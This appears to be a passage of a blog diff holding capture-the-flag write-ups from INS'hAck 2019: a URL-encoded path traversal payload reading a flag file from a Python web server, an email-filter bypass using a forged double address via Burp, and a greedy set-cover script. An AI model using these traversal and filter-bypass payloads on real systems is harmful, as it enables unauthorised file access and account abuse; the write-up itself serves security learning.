+    &lt;span class=&quot;n&quot;&gt;error_middleware&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_403&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;mi&quot;&gt;404&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_404&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;middlewares&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;error_middleware&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Web server root handler
+    '''&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;match_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'path'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'index.html'&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;client requested: {path}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;await&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Application&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;setup_error_middlewares&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r'/{path:.*}'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;web&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;stream_file&lt;/code&gt; function is not protected against &lt;strong&gt;directory path traversal&lt;/strong&gt; so it allows us to exploit a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability in order to read the file containing the flag.&lt;/p&gt;
+
+&lt;p&gt;Using &lt;code class=&quot;highlighter-rouge&quot;&gt;../&lt;/code&gt; as a payload, it will be interpreted by our browser which will request the root of the webserver. That’s not what we want so we need to &lt;strong&gt;URL-encode&lt;/strong&gt; our payload, such as: &lt;code class=&quot;highlighter-rouge&quot;&gt;..%2f&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;As suggested by the challenge statement, the flag file is stored in the &lt;code class=&quot;highlighter-rouge&quot;&gt;universe/&lt;/code&gt; folder. We can verify the LFI thanks to the following payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;..%2funiverse&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/universe.png&quot; alt=&quot;LFI PoC&quot; title=&quot;LFI PoC&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;DT_DIR&lt;/code&gt; inside the response headers indicates that we are accessing an existing directory. Now, let’s retrieve the flag thanks to the following payload: &lt;code class=&quot;highlighter-rouge&quot;&gt;..%2funiverse%2fflag&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The flag is inside the downloaded file:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;_universe_flag
+INSA&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;3e508f6e93fb2b6de561d5277f2a9b26bc79c5f349c467a91dd12769232c1a29&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;web-almost-tchap&quot;&gt;[Web] Almost Tchap&lt;/h2&gt;
+
+&lt;h3 id=&quot;statement-1&quot;&gt;Statement&lt;/h3&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;This is a message to all ATchap employees. Our new communication software is now in a beta mode. To register, just enter you email address, you’ll receive shortly the activation code.&lt;/p&gt;
+
+  &lt;p&gt;https://atchap.ctf.insecurity-insa.fr&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This challenge was in the era of time since it exploited &lt;a href=&quot;https://medium.com/@fs0c131y/tchap-the-super-not-secure-app-of-the-french-government-84b31517d144&quot;&gt;a vulnerabilty&lt;/a&gt; found by &lt;a href=&quot;https://twitter.com/fs0c131y&quot;&gt;@fs0c131y&lt;/a&gt; a few weeks ago inside the &lt;code class=&quot;highlighter-rouge&quot;&gt;Tchap&lt;/code&gt; application.&lt;/p&gt;
+
+&lt;h3 id=&quot;resolution-1&quot;&gt;Resolution&lt;/h3&gt;
+
+&lt;p&gt;The website offers to register using an email address.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/almosttchap.png&quot; alt=&quot;Almost Tchap&quot; title=&quot;Almost Tchap&quot; width=&quot;80%&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, email addresses are filtered and only an address ending with &lt;code class=&quot;highlighter-rouge&quot;&gt;@almosttchap.fr&lt;/code&gt; would be accepted.&lt;/p&gt;
+
+&lt;p&gt;Thanks to the footer of the website, it was easy to guess a valid email address, as you can see on the following picture:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/real_mail.png&quot; alt=&quot;Real emails&quot; title=&quot;Real email&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Registering with the address &lt;code class=&quot;highlighter-rouge&quot;&gt;maud.erateur@almosttchap.fr&lt;/code&gt; was authorized and we could then intercept the request with &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt; in order to modify the submitted email address.&lt;/p&gt;
+
+&lt;p&gt;Actually, forging an email address in the following format will pass the filter and send the confirmation code to our personal address: &lt;code class=&quot;highlighter-rouge&quot;&gt;personal@mail.fr@maud.erateur@almosttchap.fr&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;For this challenge, I used a temporary email address provided by &lt;a href=&quot;https://temp-mail.org/&quot;&gt;https://temp-mail.org/&lt;/a&gt;. Below, the screen capture of the request interception inside &lt;code class=&quot;highlighter-rouge&quot;&gt;Burp&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/burp.png&quot; alt=&quot;Burp&quot; title=&quot;Burp&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After forwarding the modified request, the code has been sent to us.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/2019-05-08/at-flag.png&quot; alt=&quot;Flag&quot; title=&quot;Flag&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;INSA{1fd9fa56444a424d}&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;programming-hackcode-0102&quot;&gt;[Programming] HackCode-01/02&lt;/h2&gt;
+
+&lt;h3 id=&quot;statement-2&quot;&gt;Statement&lt;/h3&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;This challenge gives 4 flags of increasing difficulty.&lt;/p&gt;
+
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/assets/2019-05-08/routes.txt&quot; title=&quot;Routes.txt&quot;&gt;This file&lt;/a&gt; contains 10 000 network routes. We want to have at least one network tap on each route. Find a list of routers to intercept, and keep the number of taps low ! You will get the first flag for any solution with at most 150 taps.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;example&quot;&gt;Example&lt;/h4&gt;
+
+&lt;p&gt;If we have the following routes :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c,b,a
+d,a,g
+b,c,e
+f,d,g
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;One solution could be :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;g
+b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The aim of this challenge was to find a minimum set of routers that covers all network routes inside routes.txt.&lt;/p&gt;
+
+&lt;p&gt;My strategy was very naive and only allowed me to reach the second flag of this challenge, but still, it was fun to do so I’ll share it here. If you want complete writeup of the 4 steps, I recommand you to read &lt;a href=&quot;https://www.aperikube.fr/docs/inshack_2019/proggenius/&quot;&gt;this one&lt;/a&gt; from Aperikube.&lt;/p&gt;
+
+&lt;h3 id=&quot;strategy&quot;&gt;Strategy&lt;/h3&gt;
+
+&lt;p&gt;This piece of pseudo-code will help you understanding my approach:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;occurences_set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count_occurences_of_each_router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;init_routes_coverage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Tells which routes are already covered by a router
+&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routes&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;are&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;covered&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;txt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;already&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;covered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_the_best_router_of_the_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// The best in term of number of occurences
+&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;part-01&quot;&gt;Part 01&lt;/h3&gt;
+
+&lt;p&gt;I wrote &lt;a href=&quot;http://localhost:4000/assets/2019-05-08/script01.py&quot; title=&quot;HackCode 01 script&quot;&gt;the following script&lt;/a&gt;, implementing the approach explained before, giving a solution of &lt;strong&gt;141 routers&lt;/strong&gt;. This was enough for the first flag!&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;finished&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;coverage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;coverage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;solution_covers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solution&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_unique_routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'routes.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;readlines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;splitted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;#print(routers)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; unique routers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;count_router_occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'routes.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'r'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;router&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;routers_list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;router&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;sorted_occurences&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;k&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sorted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;occurences&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reverse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sorted_occurences&lt;/span&gt;
+
